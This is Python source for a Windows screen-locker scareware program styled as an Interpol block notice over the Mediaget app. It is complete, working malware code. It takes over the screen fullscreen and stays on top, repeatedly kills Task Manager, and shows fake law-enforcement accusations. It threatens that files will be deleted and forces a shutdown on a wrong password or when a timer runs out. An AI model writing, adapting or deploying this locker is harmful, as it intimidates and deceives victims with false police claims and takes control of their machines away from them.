import os, sys, time, threading, subprocess, tkinter as tk
from tkinter import ttk, Tk, Label
import pygame
from PIL import Image, ImageTk

# --- THE MAGIC FIX FOR EXEs ---
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- SYSTEM SECURITY ---
def kill_taskmgr():
    while True:
        subprocess.call("taskkill /F /IM taskmgr.exe /T >nul 2>&1", shell=True)
        time.sleep(0.8)

class OGLocker:
    def __init__(self, root):
        self.root = root
        self.time_left = 300 
        self.password = "install2017mediagetforfree2013"
        
        w, h = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry(f"{w}x{h}+0+0")
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.overrideredirect(True) 
        self.root.configure(bg="black")
        
        pygame.mixer.init()
        # FIX: Using resource_path for the music
        self.play_audio(resource_path(os.path.join("resources", "main.mp3")))
        
        threading.Thread(target=kill_taskmgr, daemon=True).start()
        
        self.setup_ui()
        self.start_timer()
        self.maintain_focus()

    def play_audio(self, full_path):
        try:
            pygame.mixer.music.load(full_path)
            pygame.mixer.music.play(-1)
        except Exception as e:
            print(f"Audio Error: {e}")

    def setup_ui(self):
        # FIX: Using resource_path for the background image
        try:
            img_p = resource_path(os.path.join("resources", "img.png"))
            img = Image.open(img_p)
            img = img.resize((self.root.winfo_screenwidth(), self.root.winfo_screenheight()))
            self.bg_img = ImageTk.PhotoImage(img)
            Label(self.root, image=self.bg_img).place(x=0, y=0, relwidth=1, relheight=1)
        except Exception as e:
            print(f"Image Error: {e}")

        # UI Labels (OG Text)
        tk.Label(self.root, text="Time Left:", bg="yellow", font=("Consolas", 36)).place(x=270, y=40)
        self.timer_label = tk.Label(self.root, text="05:00", font=("Consolas", 48), bg="red")
        self.timer_label.place(x=700, y=30)

        msg1 = ("Your computer has been blocked by Interpol\nMediaget\n"
                "Currently, CIA and FBP agents are investigating the\n"
                "distribution of drugs in the Mediaget application. We\n"
                "urge you to remain calm and wait for Interpol agents\n"
                "to come to you.")
        tk.Label(self.root, text=msg1, fg="white", bg="black", justify="left", font=("Consolas", 17)).place(x=20, y=180)

        msg2 = ("You also have the option to delete Windows, to\ndo this, "
                "just press enter, all your files will be\npermanently deleted.")
        tk.Label(self.root, text=msg2, fg="black", bg="red", justify="left", font=("Consolas", 19)).place(x=20, y=450)

        tk.Label(self.root, text="Enter password:", bg="yellow", font=("Consolas", 32)).place(x=27, y=900)
        self.entry = tk.Entry(self.root, width=20, font=("Consolas", 45), bg="black", fg="white", insertbackground="white")
        self.entry.place(x=600, y=885)
        
        self.entry.focus_set()
        self.entry.bind('<Return>', self.handle_entry)

    def start_timer(self):
        if self.time_left > 0:
            mins, secs = divmod(self.time_left, 60)
            self.timer_label.config(text=f"{mins:02}:{secs:02}")
            self.time_left -= 1
            self.root.after(1000, self.start_timer)
        else:
            self.trigger_shutdown()

    def maintain_focus(self):
        self.root.attributes("-topmost", True)
        self.root.lift()
        if not self.root.grab_current():
            try: self.root.grab_set()
            except: pass
        self.root.after(200, self.maintain_focus)

    def handle_entry(self, event):
        if self.entry.get() == self.password:
            self.exit_locker()
        else:
            self.trigger_shutdown()

    def trigger_shutdown(self):
        os.system("shutdown /s /f /t 0")

    def exit_locker(self):
        subprocess.call("explorer.exe", shell=True)
        self.root.destroy()
        sys.exit()

if __name__ == "__main__":
    root = Tk()
    app = OGLocker(root)
    root.mainloop()